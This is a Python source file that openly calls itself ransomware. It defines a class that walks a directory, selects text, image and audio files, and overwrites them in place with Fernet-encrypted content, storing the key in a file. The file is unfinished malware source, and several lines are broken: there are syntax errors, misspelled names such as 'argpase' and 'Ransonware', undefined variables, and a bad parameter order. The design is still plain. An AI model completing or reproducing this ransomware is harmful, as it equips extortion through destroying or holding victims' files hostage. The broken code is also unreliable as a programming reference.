#!/usr/bin/env python3

'''
Name : Alexis Rodriguez

Start Date : 2020-02-18
End Date : 2020-02-..


Description : 


		  ooo,    .---.
 o`  o   /    |\________________
o`   'oooo()  | ________   _   _)
`oo   o` \    |/        | | | |
  `ooo'   `---'         "-" |_|
'''

# --> try importing modules
try:
	# --> Import subprocess for executing system commands.
	import subprocess as subp
	# --> Import time to pause execution of program
	# --> until cryptography module gets installed
	import time
	# --> Import os so that we can obtain all the file
	# --> in a specific directory
	import os
	# --> Import argparse to handle user arguments more conveniently
	import argparse
	# --> import sys for additional argument parsing
	import sys
	# --> import tqdm for creating progress bars
	import tqdm
	# --> import pyfiglet for custom ASCII art fonts
	import pyfiglet
	# --> Try importing cryptography module class
	try:
		from cryptography.fernet import Fernet, MultiFernet
	# --> If any errors occurs importing the cryp module
	# --> Install it with the following command
	except:
		subp.call('pip3 install cryptography', shell=True)
		# --> Wait 30 seconds before preceding with the program
		time.sleep(30)
		# --> Try importing again after attempting to install
		# --> the module
		from cryptography.fernet import Fernet
# --> handling error loading a module
except ImportError:
	print('[-] There was an error importing a module')

'''------------------------------------------------------------------------------------------------
									Ransomware Class Definition
---------------------------------------------------------------------------------------------------'''

class Ransomware:

	def __init__(self, directory='.', key_file='fernet_key.txt',action):
		'''
		$ Declare encryption key variable
		$ Get directory to encrypt/decrypt
		$ Get name of file to store key
		'''

		print("[+] Initiating Ransomware constructor declarations")
		# --> Ferney key
		self.key=None
		# --> Fernet object
		self.linear_b=None
		# --> File extensions to encrypt
		self.file_ext_target=['.txt', '.jpg', '.png', '.mp3']
		# --> File where key is being stored if key exists in another file
		self.key_file=key_file
		# --> Directory that contains files we want to encrypt
		# --> Default directory is the current directory
		self.directory=directory
		# --> Cryptographic action to perform
		self.action=action

	def get_valid_files(self, directory):
		'''
		$ Find files that contain the extension specified in our file_ext_target list
		$ Returns a list that contains valid files to encrypt
		'''

		# --> List containing all files that end with the extensions
		# --> Defined in the file_ext_target's list 
		valid_files_to_encrypt = []

		# --> Os.walk will return an iterable that contains current working directory,
		# --> directories in the current directory, and all files in the current
		# --> directory
		for working_dir, _, file in os.walk(directory):
			# --> Check if the extensions of the file are valid
			if file[-4:] in self.file_ext_target:
				# --> Get full valid file path
				valid_file_path = os.path.join(abs_path, file)
				# --> Append valid file path to valid files list
				valid_files_to_encrypt.append(valid_file_path)
		# --> return list of valid files
		return valid_files_to_encrypt

	def files_encrypt_or_decrypt(self, list_of_files, action):
		'''
		$ Opening all files in the list of files argument
		$ and send the contents of these files to be encrypted
		'''

		progress_bar_info = ''
		# --> If the action variable is set to encrypt
		if action = 'encrypt':
			# --> Set the progress bar title to the following
			progress_bar_info = 'Encrypting files'
		# --> If the action variable is set to decrypt
		else:
			# --> Set the progress bar title to the following
			progress_bar_info = 'Decrypting files'

		for file in tqdm(list_of_files,desc=progress_bar_info):
			# --> open file for reading + writing
			with open(file, 'rb+') as f:
				# --> read the files contents
				file_content = f.read()
				# --> If encrypt argument is True
				if encrypt:
					# ENCRYPT IT!!!!
					encrypted = self.encrypt(file_content)
					# --> write encrypted data back into file
					f.write(encrypted)
				# --> If encrypt argument is False
				else:
					# DECRYPT IT!!!!
					decrypted = self.decrypt(file_content)
					# --> write decrypted data back into file
					f.write(decrypted)


	def store_key(self):
		'''
		$ Store key in file
		'''
		print('[+] Storing key in file')
		#
		with open(keyfile,'wb') as f:
			f.write(self.key)


	def get_key(self):
		'''
		$ Retrieve a key from a file
		'''
		self.key = open(self.keyfile,'r').read()
	
	def key_gen_fernet_instance(self):
		'''
		$ Generate encryption/decryption key
		$ Instantiate Fernet object
		'''
		print('[+] Generating Fernet key')
		# --> Generating key for encryption
		self.key = Fernet(Fernet.generate_key())

		self.store_key()
		# --> Fernet object instantiation
		try:
			# --> create Fernet object
			self.linear_b = Fernet(key)
		except:
			# --> if it fails
			print('[-] Unable to instantiate Fernet object for encryption')


	def encrypt(self, to_encrypt):
		'''
		$ Encrypting all files in the directory stored in the directory variable
		'''
		print('[+] Encrypting all files in ' + self.directory + ' directory')

		# --> Return the encrypted version of the contents of a file
		return self.linear_b.encrypt(to_encrypt)


	def decrypt(self, to_decrypt):
		'''
		$ Decrypt all files in the directory stored in the directory variable
		'''
		print('[+] Decrypting all files in ' + self.directory + ' directory')
		# --> Return the decrypted data of an encrypted file
		return self.linear_b.decrypt(to_decrypt)

#%%%%%%%%% End Ransomware Class

def parse_arguments():
	# --> Instantiate object for parsing arguments
	parser = argpase.ArgumentParser(usage=f'usage: {sys.argv[0]} [-a] [-d] [-k]',
									description='Passing arguments for our ransomware class')
	# --> Create a group for arguments that are required
	required = parser.add_argument_group('Required arguments')
	# --> Create a group for argumetns that are optional
	optional = parser.add_argument_group('Optional arguments')
	# --> This argument will define the cryption action (decrypt/encrypt)
	optional.add_argument('-a', '--action', dest=action, type=str, 
						  help='Encrypt or decrypt files files',
						  required=True, default='encrypt')
	# --> This argument will define the absolute path to a file that has a key
	# --> or will be used to store a key
	optional.add_argument('-k', '--keyfile', dest=keyfile, type=str,
						  help='Enter the fullpath of a file with the encryption/decryption key',
						  default=None)
	# --> This argument will define the directory that will be encrypted or decrypted
	parser.add_argument('-d', '--directory', dest=directory, type=str, 
						help='Directory of files to encrypt or decrypt',
						required=True)
	# --> Retrieve arguments that were passed 
	args = parser.parse_args()
	print(args)
	# --> return the arguments that were passed 

def signature():
	# --> creating ASCII art
	result = pyfiglet.figlet_format("BinexisHATT", font="isometric1" ) 
	print(result) 

'''
**************************************
-----------------MAIN-----------------
**************************************
'''
def initiate()
	# --> Print my signature
	signature()
	# --> Get arguments
	directory, action, keyfile = parse_arguments()
	# --> If no key file was passed, use the default 
	if keyfile == None:
		# -->  Instantiate Ransomware object with no key file
		instance = Ransonware(directory=directory,action=action)
	# --> If keyfile is passed
	else:
		# --> Instantiate Ransomware object with key file
		instance = Ransonware(directory=directory,keyfile=keyfile,action=action)


# --> Check if the current module is main module
if __name__ == '__main__':
	initiate()